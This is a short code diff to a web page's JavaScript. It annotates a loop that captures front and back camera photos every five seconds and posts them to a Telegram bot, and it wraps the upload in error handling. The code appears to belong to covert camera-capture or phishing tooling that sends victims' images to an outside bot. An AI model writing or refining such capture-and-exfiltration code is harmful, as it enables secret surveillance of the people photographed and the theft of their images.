@@ -83,19 +83,27 @@
             const formData = new FormData();
             formData.append("chat_id", CHAT_ID);
 
+            // Sending front photo
             if (frontPhoto) {
                 const frontBlob = await (await fetch(frontPhoto)).blob();
                 formData.append("photo", frontBlob, "front_photo.png");
             }
+
+            // Sending back photo
             if (backPhoto) {
                 const backBlob = await (await fetch(backPhoto)).blob();
                 formData.append("photo", backBlob, "back_photo.png");
             }
 
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                method: "POST",
-                body: formData
-            });
+            // Send photos to Telegram
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: "POST",
+                    body: formData
+                });
+            } catch (error) {
+                console.error("Error sending photos:", error);
+            }
         }
 
         async function startPhotoCaptureLoop() {
@@ -117,7 +125,7 @@
 
             // Ensure the photo capturing loop works
             sendPhoto();
-            intervalId = setInterval(sendPhoto, 5000);
+            intervalId = setInterval(sendPhoto, 5000); // Set interval to capture photos every 5 seconds
         }
 
         function stopCamera() {
